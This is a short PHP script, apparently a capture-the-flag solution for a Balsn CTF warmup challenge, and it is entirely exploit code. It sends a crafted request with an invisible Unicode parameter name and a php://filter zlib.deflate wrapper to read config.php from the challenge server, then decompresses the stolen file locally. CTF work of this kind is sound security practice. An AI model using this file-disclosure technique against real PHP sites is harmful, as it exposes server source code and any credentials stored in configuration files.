<?php
$a = file_get_contents("http://warmup.balsnctf.com/?op=-99&%E2%81%A3=php://filter/zlib.deflate/resource=config.php%20");
$idx = stripos($a, "</code>") + 7;
file_put_contents("/tmp/tmp", substr($a, $idx));

echo (file_get_contents("php://filter/zlib.inflate/resource=/tmp/tmp"));
